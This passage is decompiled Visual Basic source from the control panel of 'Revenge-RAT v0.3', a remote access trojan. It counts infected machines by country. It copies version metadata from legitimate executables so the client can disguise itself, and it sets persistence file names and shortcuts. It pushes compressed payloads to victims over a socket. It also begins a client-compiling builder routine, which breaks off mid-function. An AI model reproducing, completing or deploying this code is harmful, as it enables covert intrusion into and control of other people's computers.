            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bouvet Island : ", Main.BouvetIsland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Brazil, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Brazil : ", Main.Brazil)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.BritishIndianOceanTerritory, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "British Indian Ocean Territory : ", Main.BritishIndianOceanTerritory)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.BritishVirginIsland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "British Virgin Island : ", Main.BritishVirginIsland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.BruneiDarussalam, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Brunei Darussalam : ", Main.BruneiDarussalam)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Bulgaria, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Bulgaria : ", Main.Bulgaria)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.BurkinaFaso, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Burkina Faso : ", Main.BurkinaFaso)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Burundi, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Burundi : ", Main.Burundi)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Cambodia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cambodia : ", Main.Cambodia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Cameroon, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cameroon : ", Main.Cameroon)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Canada, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Canada : ", Main.Canada)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.CVC, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cape Verde : ", Main.CVC)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Catalonia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Catalonia : ", Main.Catalonia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.CaymanIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cayman Islands : ", Main.CaymanIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.CentralAfricanRepublic, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Central African Republic : ", Main.CentralAfricanRepublic)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Chad, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Chad : ", Main.Chad)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Chile, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Chile : ", Main.Chile)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.China, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "China : ", Main.China)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.ChristmasIsland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Christmas Island : ", Main.ChristmasIsland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.CCKI, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cocos (Keeling Islands) : ", Main.CCKI)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Colombia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Colombia : ", Main.Colombia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Comoros, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Comoros : ", Main.Comoros)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.DemocraticRepublicoftheCongo, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Democratic Republic of the Congo : ", Main.DemocraticRepublicoftheCongo)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.CostaRica, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Costa Rica : ", Main.CostaRica)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Croatia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Croatia : ", Main.Croatia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Cuba, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cuba : ", Main.Cuba)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Cyprus, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Cyprus : ", Main.Cyprus)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.CzechRepublic, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Czech Republic : ", Main.CzechRepublic)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Denmark, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Denmark : ", Main.Denmark)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Djibouti, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Djibouti : ", Main.Djibouti)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Dominica, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Dominica : ", Main.Dominica)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.DominicanRepublic, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Dominican Republic : ", Main.DominicanRepublic)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Ecuador, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Ecuador : ", Main.Ecuador)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Egypt, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Egypt : ", Main.Egypt)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.ElSalvador, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "El Salvador : ", Main.ElSalvador)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.England, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "England : ", Main.England)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.EquatorialGuinea, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Equatorial Guinea : ", Main.EquatorialGuinea)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Eritrea, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Eritrea : ", Main.Eritrea)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Estonia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Estonia : ", Main.Estonia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Ethiopia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Ethiopia : ", Main.Ethiopia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Europe, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Europe : ", Main.Europe)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.FalklandIslandsMalvinas, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Falkland Islands (Malvinas) : ", Main.FalklandIslandsMalvinas)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.NA, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Unknown : ", Main.NA)))
        End If
        Return obj2
    End Function

    Private Sub CIcon_CheckedChanged(sender As Object, e As EventArgs) Handles CIcon.CheckedChanged
        Me.Refresh.PerformClick()
    End Sub
    Public Function CIST(ByVal Input As String) As Boolean
        Return ((Input = "Dark Slate Blue.XML") OrElse ((Input = "Default.XML") OrElse ((Input = "Night Fury.XML") OrElse ((Input = "Spring Green.XML") OrElse ((Input = "Steel Blue.XML") OrElse ((Input = "Teal.XML") OrElse ((Input = "THE MYSTERIES LEGACY.XML") OrElse ((Input = "Tsunamii.XML") OrElse ((Input = "v_B01 - 3hud.XML") OrElse ((Input = "Light Sea Green.XML") OrElse ((Input = "Gray.XML") OrElse ((Input = "Ebony.XML") OrElse ((Input = "Darkness.XML") OrElse ((Input = "Corduroy.XML") OrElse ((Input = "Gondola.XML") OrElse (Input = "Black Currant.XML"))))))))))))))))
    End Function

    Public Function CK(ByVal A As Integer, ByVal B As Boolean, ByVal C As Boolean, ByVal D As Integer, ByVal F As Boolean, ByVal G As Integer, ByVal H As Boolean, ByVal V As Boolean, ByVal RZ As Boolean, ByVal RWCA As Boolean, ByVal RWCV As Integer, ByVal ASL As Boolean) As Object
        Dim obj2 As Object
        If (A = 0) Then
            Me.Listview1.LargeImageList = Me.ImageList1
            Me.Listview1.SmallImageList = Me.ImageList1
        ElseIf (A = 1) Then
            Me.Listview1.LargeImageList = Me.ii
            Me.Listview1.SmallImageList = Me.ii
        ElseIf (A = 2) Then
            Me.Listview1.LargeImageList = Me.ImageList2
            Me.Listview1.SmallImageList = Me.ImageList2
        ElseIf (A = 3) Then
            Me.Listview1.LargeImageList = Me.ImageList3
            Me.Listview1.SmallImageList = Me.ImageList3
        End If
        Me.Listview1.AllowColumnReorder = B
        Me.Listview1.GridLines = C
        Me.Logs.GridLines = C
        Me.Plugin.GridLines = C
        If (D = 0) Then
            Me.Listview1.View = Windows.Forms.View.LargeIcon
        ElseIf (D = 1) Then
            Me.Listview1.View = Windows.Forms.View.SmallIcon
        ElseIf (D = 2) Then
            Me.Listview1.View = Windows.Forms.View.Details
        ElseIf (D = 3) Then
            Me.Listview1.View = Windows.Forms.View.Tile
        ElseIf (D = 4) Then
            Me.Listview1.View = Windows.Forms.View.List
        End If
        Me.SA = F
        Me.DV = G
        Me.Sound = H
        Me.VIS = V
        Me.REZ = RZ
        Me.RWC = RWCA
        Me.RWV = RWCV
        Me.AL = ASL
        Return obj2
    End Function

    Private Sub CL_Click(sender As Object, e As EventArgs) Handles CL.Click
        If Operators.ConditionalCompareObjectEqual(Me.CL.Tag, "Down", False) Then
            Me.CL.Tag = "Up"
            Me.CL.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel49.Size.Width, &H20)
            Me.TableLayoutPanel49.Size = size3
        Else
            Me.CL.Tag = "Down"
            Me.CL.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel49.Size.Width, &HA5)
            Me.TableLayoutPanel49.Size = size2
        End If
    End Sub
    Public Function CLC() As Object
        Dim obj2 As Object
        Main.Afghanistan = 0
        Main.Albania = 0
        Main.Algeria = 0
        Main.AmericanSamoa = 0
        Main.Andorra = 0
        Main.Angola = 0
        Main.Anguilla = 0
        Main.AntiguaandBarbuda = 0
        Main.Argentina = 0
        Main.Armenia = 0
        Main.Aruba = 0
        Main.Australia = 0
        Main.Austria = 0
        Main.Azerbaijan = 0
        Main.Bahamas = 0
        Main.Bahrain = 0
        Main.Bangladesh = 0
        Main.Barbados = 0
        Main.Belarus = 0
        Main.Belgium = 0
        Main.Belize = 0
        Main.Benin = 0
        Main.Bermuda = 0
        Main.Bhutan = 0
        Main.Bolivia = 0
        Main.BosniaandHerzegovina = 0
        Main.Botswana = 0
        Main.BouvetIsland = 0
        Main.Brazil = 0
        Main.BritishIndianOceanTerritory = 0
        Main.BritishVirginIsland = 0
        Main.BruneiDarussalam = 0
        Main.Bulgaria = 0
        Main.BurkinaFaso = 0
        Main.Burundi = 0
        Main.Cambodia = 0
        Main.Cameroon = 0
        Main.Canada = 0
        Main.CVC = 0
        Main.Catalonia = 0
        Main.CaymanIslands = 0
        Main.CentralAfricanRepublic = 0
        Main.Chad = 0
        Main.Chile = 0
        Main.China = 0
        Main.ChristmasIsland = 0
        Main.CCKI = 0
        Main.Colombia = 0
        Main.Comoros = 0
        Main.DemocraticRepublicoftheCongo = 0
        Main.CostaRica = 0
        Main.Croatia = 0
        Main.Cuba = 0
        Main.Cyprus = 0
        Main.CzechRepublic = 0
        Main.Denmark = 0
        Main.Djibouti = 0
        Main.Dominica = 0
        Main.DominicanRepublic = 0
        Main.Ecuador = 0
        Main.Egypt = 0
        Main.ElSalvador = 0
        Main.England = 0
        Main.EquatorialGuinea = 0
        Main.Eritrea = 0
        Main.Estonia = 0
        Main.Ethiopia = 0
        Main.Europe = 0
        Main.FalklandIslandsMalvinas = 0
        Main.FaroeIslands = 0
        Main.Fiji = 0
        Main.Finland = 0
        Main.France = 0
        Main.FrenchGuiana = 0
        Main.FrenchPolynesia = 0
        Main.FrenchSouthernTerritories = 0
        Main.Gabon = 0
        Main.Gambia = 0
        Main.Georgia = 0
        Main.Germany = 0
        Main.Ghana = 0
        Main.Gibraltar = 0
        Main.Greece = 0
        Main.Greenland = 0
        Main.Grenada = 0
        Main.Guadeloupe = 0
        Main.Guam = 0
        Main.Guatemala = 0
        Main.Guinea = 0
        Main.GuineaBissau = 0
        Main.Guyana = 0
        Main.Haiti = 0
        Main.HeardIslandandMcDonaldIslands = 0
        Main.Honduras = 0
        Main.HongKong = 0
        Main.Hungary = 0
        Main.Iceland = 0
        Main.India = 0
        Main.Indonesia = 0
        Main.IslamicRepublicofIran = 0
        Main.Iraq = 0
        Main.Ireland = 0
        Main.PalestinianTerritory = 0
        Main.Italy = 0
        Main.Jamaica = 0
        Main.Japan = 0
        Main.Jordan = 0
        Main.Kazakhstan = 0
        Main.Kenya = 0
        Main.Kiribati = 0
        Main.NorthKorea = 0
        Main.SouthKorea = 0
        Main.Kuwait = 0
        Main.Kyrgyzstan = 0
        Main.LaoPeoplesDemocraticRepublic = 0
        Main.Latvia = 0
        Main.Lebanon = 0
        Main.Lesotho = 0
        Main.Liberia = 0
        Main.Libya = 0
        Main.Liechtenstein = 0
        Main.Lithuania = 0
        Main.Luxembourg = 0
        Main.Macao = 0
        Main.RepublicofMacedonia = 0
        Main.Madagascar = 0
        Main.Malawi = 0
        Main.Malaysia = 0
        Main.Maldives = 0
        Main.Mali = 0
        Main.Malta = 0
        Main.MarshallIslands = 0
        Main.Martinique = 0
        Main.Mauritania = 0
        Main.Mauritius = 0
        Main.Mayotte = 0
        Main.Mexico = 0
        Main.FederatedStatesofMicronesia = 0
        Main.RepublicofMoldova = 0
        Main.PrincipalityofMonaco = 0
        Main.Mongolia = 0
        Main.Montenegro = 0
        Main.Montserrat = 0
        Main.Morocco = 0
        Main.Mozambique = 0
        Main.Myanmar = 0
        Main.Namibia = 0
        Main.Nauru = 0
        Main.Nepal = 0
        Main.NetherlandsAntilles = 0
        Main.Netherlands = 0
        Main.NewCaledonia = 0
        Main.NewZealand = 0
        Main.Nicaragua = 0
        Main.Niger = 0
        Main.Nigeria = 0
        Main.Niue = 0
        Main.NorfolkIsland = 0
        Main.NorthernMarianaIslands = 0
        Main.Norway = 0
        Main.SultanateofOman = 0
        Main.IslamicRepublicofPakistan = 0
        Main.Palau = 0
        Main.Panama = 0
        Main.PapuaNewGuinea = 0
        Main.Paraguay = 0
        Main.Peru = 0
        Main.Philippines = 0
        Main.PitcairnIslands = 0
        Main.Poland = 0
        Main.Portugal = 0
        Main.Palestine = 0
        Main.PuertoRico = 0
        Main.Qatar = 0
        Main.Reunion = 0
        Main.Romania = 0
        Main.Serbia = 0
        Main.Russia = 0
        Main.Rwanda = 0
        Main.SaintHelena = 0
        Main.SaintKittsandNevis = 0
        Main.SaintLucia = 0
        Main.SaintPierreandMiquelon = 0
        Main.SaintVincentandtheGrenadines = 0
        Main.Samoa = 0
        Main.SanMarino = 0
        Main.SaoTomeandPrincipe = 0
        Main.SaudiArabia = 0
        Main.Scotland = 0
        Main.Senegal = 0
        Main.Seychelles = 0
        Main.SierraLeone = 0
        Main.Singapore = 0
        Main.Slovakia = 0
        Main.Slovenia = 0
        Main.SolomonIslands = 0
        Main.Somalia = 0
        Main.SouthAfrica = 0
        Main.SouthGeorgiaandtheSouthSandwichIslands = 0
        Main.Spain = 0
        Main.SriLanka = 0
        Main.Sudan = 0
        Main.Suriname = 0
        Main.SvalbardandJanMayen = 0
        Main.Swaziland = 0
        Main.Sweden = 0
        Main.Switzerland = 0
        Main.Syria = 0
        Main.Taiwan = 0
        Main.Tajikistan = 0
        Main.UnitedRepublicofTanzania = 0
        Main.Thailand = 0
        Main.Togo = 0
        Main.Tokelau = 0
        Main.Tonga = 0
        Main.TrinidadAndTobago = 0
        Main.Tunisia = 0
        Main.Turkey = 0
        Main.Turkmenistan = 0
        Main.TurksandCaicosIslands = 0
        Main.Tuvalu = 0
        Main.Uganda = 0
        Main.Ukraine = 0
        Main.UnitedArabEmirates = 0
        Main.UnitedKingdom = 0
        Main.UnitedStatesMinorOutlyingIslands = 0
        Main.UnitedStates = 0
        Main.Uruguay = 0
        Main.Uzbekistan = 0
        Main.Wales = 0
        Main.WallisAndFutuna = 0
        Main.Vanuatu = 0
        Main.VaticanCityState = 0
        Main.Venezuela = 0
        Main.WesternSahara = 0
        Main.Vietnam = 0
        Main.UnitedStatesVirginIslands = 0
        Main.Yemen = 0
        Main.Zambia = 0
        Main.Zimbabwe = 0
        Main.CookIslands = 0
        Main.Antarctica = 0
        Main.Congo = 0
        Main.CoteDIvoire = 0
        Main.SatelliteProvider = 0
        Main.AlandIslands = 0
        Main.Guernsey = 0
        Main.IsleofMan = 0
        Main.Jersey = 0
        Main.SaintBarthelemy = 0
        Main.NA = 0
        Return obj2
    End Function

    Private Sub CleanListToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CleanListToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.BinderFilesList.Items.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub ClearListToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearListToolStripMenuItem.Click
        If (Me.BlockedIp.Items.Count > 0) Then
            Try
                Me.BlockedIp.Items.Clear()
            Catch exception1 As Exception
            End Try
        End If
    End Sub

    Private Sub ClearListToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ClearListToolStripMenuItem1.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.HostsList.Items.GetEnumerator
            Do While enumerator.MoveNext
                DirectCast(enumerator.Current, ListViewItem).Remove()
            Loop
        Finally
        End Try
    End Sub

    Private Sub Cloner_Click(sender As Object, e As EventArgs)
        Dim num2 As Integer
        Try
            Dim num3 As Integer
Label_0001:
            num3 = 1
            Dim dialog As New OpenFileDialog
Label_000A:
            num3 = 2
            dialog.Filter = "(.exe) |*.exe"
Label_0019:
            num3 = 3
            dialog.ShowDialog()
Label_0023:
            num3 = 4
            If (dialog.FileName.Length <= 0) Then
                GoTo Label_01A6
            End If
Label_003D:
            ProjectData.ClearProjectError()
            Dim num As Integer = -2
Label_0045:
            num3 = 6
            Dim versionInfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(dialog.FileName)
Label_0054:
            num3 = 7
            Me.AssTitle.Text = Path.GetFileNameWithoutExtension(dialog.FileName)
Label_006E:
            num3 = 8
            Me.AssDes.Text = versionInfo.FileDescription
Label_0083:
            num3 = 9
            Me.AssCom.Text = versionInfo.CompanyName
Label_0099:
            num3 = 10
            Me.AssPro.Text = versionInfo.ProductName
Label_00AF:
            num3 = 11
            Me.AssCopy.Text = versionInfo.LegalCopyright
Label_00C5:
            num3 = 12
            Me.AssTrade.Text = versionInfo.LegalTrademarks
Label_00DB:
            num3 = 13
            Me.FileVersionTX.Text = versionInfo.FileVersion
Label_00F1:
            num3 = 14
            Me.ProductVersionTX.Text = versionInfo.ProductVersion
            GoTo Label_01A6
Label_0113:
            num2 = 0
            Select Case (num2 + 1)
                Case 1
                    GoTo Label_0001
                Case 2
                    GoTo Label_000A
                Case 3
                    GoTo Label_0019
                Case 4
                    GoTo Label_0023
                Case 5
                    GoTo Label_003D
                Case 6
                    GoTo Label_0045
                Case 7
                    GoTo Label_0054
                Case 8
                    GoTo Label_006E
                Case 9
                    GoTo Label_0083
                Case 10
                    GoTo Label_0099
                Case 11
                    GoTo Label_00AF
                Case 12
                    GoTo Label_00C5
                Case 13
                    GoTo Label_00DB
                Case 14
                    GoTo Label_00F1
                Case 15, &H10
                    GoTo Label_01A6
                Case Else
                    GoTo Label_019B
            End Select
Label_0160:
            num2 = num3
            Select Case If((num > -2), num, 1)
                Case 0
                    GoTo Label_019B
                Case 1
                    GoTo Label_0113
            End Select
        Catch obj1 As Exception
            '  ProjectData.SetProjectError(DirectCast(obj1, Exception))
            GoTo Label_0160
        End Try
Label_019B:
        '  Throw ProjectData.CreateProjectError(-2146828237)
Label_01A6:
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            Dim enumerator As IEnumerator = Me.Listview1.SelectedItems.GetEnumerator()
            While enumerator.MoveNext()
                Dim listViewItem As ListViewItem = CType(enumerator.Current, ListViewItem)
                Me.s.Send(Conversions.ToInteger(listViewItem.ToolTipText), String.Concat(New String() {"UNV", Me.Key, Convert.ToBase64String(SocketServer.Compress(My.Resources.UNI)), Me.Key, "UNI.UNI", Me.Key, Me.RandomVariable(5, 8), Me.Key, "True", Me.Key, "False", Me.Key, "False", Me.Key, Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False", Me.Key, "False", Me.Key, SocketServer.GenRandom(1, 10), ".tmp", Me.RandomVariable(1, 5), Me.Key, Me.RandomVariable(1, 5), Me.Key, "False"}))
            End While
        Finally
            Dim enumerator As IEnumerator
            Dim flag As Boolean = TypeOf enumerator Is IDisposable
            If flag Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub CMPM_CheckedChanged(sender As Object, e As EventArgs) Handles CMPM.CheckedChanged
        Me.CNINAPPDATA.Enabled = Me.CMPM.Checked
        Me.TASKBARFN.Enabled = Me.CMPM.Checked
        Me.DESKTOPSHORTCUTPATH.Enabled = Me.CMPM.Checked
        Me.QUICKLUNCHSHORTCUTPATH.Enabled = Me.CMPM.Checked
        If (Me.CNINAPPDATA.Text = Nothing) Then
            Me.CNINAPPDATA.Text = "Client.exe"
        End If
        If (Me.TASKBARFN.Text = Nothing) Then
            Me.TASKBARFN.Text = "Random"
        End If
        If (Me.DESKTOPSHORTCUTPATH.Text = Nothing) Then
            Me.DESKTOPSHORTCUTPATH.Text = "Default"
        End If
        If (Me.QUICKLUNCHSHORTCUTPATH.Text = Nothing) Then
            Me.QUICKLUNCHSHORTCUTPATH.Text = "Optional"
        End If
    End Sub

    Private Sub CNINAPPDATA_DoubleClick(sender As Object, e As EventArgs) Handles CNINAPPDATA.DoubleClick
        Me.CNINAPPDATA.Text = (Me.RandomVariable(5, 8) & ".exe")
    End Sub

    Private Sub Comands_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Comands.SelectedIndexChanged
        If (Me.Comands.SelectedIndex = 0) Then
            Me.CommandData.Enabled = True
        Else
            If (Me.CommandData.Text.Length > 0) Then
                Me.CommandData.Text = Nothing
            End If
            Me.CommandData.Enabled = False
        End If
    End Sub

    Private Sub CompileClient_Click(sender As Object, e As EventArgs) Handles CompileClient.Click
        Try
            File.Delete((Interaction.Environ("Temp") & "\RV.IL"))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
        If Not Me.ATOS.Checked Then
            MessageBox.Show("Building Process Aborted. You must agree TOS!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Dim fileName As String
            Me.Save_Builder_Settings("Default")
            Dim dialog As New SaveFileDialog
            Dim dialog2 As SaveFileDialog = dialog
            dialog2.Filter = "(.exe) |*.exe"
            dialog2.FileName = "Client"
            dialog2.InitialDirectory = Application.StartupPath
            If (dialog2.ShowDialog = DialogResult.OK) Then
                fileName = dialog2.FileName
            Else
                Return
            End If
            dialog2 = Nothing
            Try
                If File.Exists(dialog.FileName) Then
                    File.Delete(dialog.FileName)
                End If
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                Dim exception As Exception = exception2
                MessageBox.Show(exception.Message.ToString, "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                ProjectData.ClearProjectError()
                Return
            End Try
            Dim logs As New BLogs
            logs.Text = ("Builder Logs @" & Environment.MachineName)
            logs.TopMost = True
            logs.Show()

            If (Me.HostsList.Items.Count = 0) Then
                logs.C(Color.Black, ("[" & Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))) & "] : "))
